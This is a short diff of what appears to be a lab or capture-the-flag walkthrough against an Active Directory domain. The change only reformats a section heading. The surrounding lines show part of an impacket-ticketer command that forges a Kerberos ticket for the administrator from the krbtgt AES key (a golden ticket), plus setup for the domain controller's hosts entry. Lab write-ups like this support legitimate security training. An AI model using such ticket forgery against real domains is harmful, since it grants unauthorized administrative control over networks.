@@ -563,7 +563,7 @@ impacket-ticketer -aesKey <KRBTGT_AES256> \
 export KRB5CCNAME=$(pwd)/administrator.ccache
 ```
 
-4.13 — plumbing (Kali T1). hosts + krb5.conf:
+### Plumbing (Kali T1). hosts + krb5.conf:
 
 ```bash
 echo "172.16.20.2 DC02.darkzero.ext darkzero.ext DARKZERO.EXT" | sudo tee -a /etc/hosts
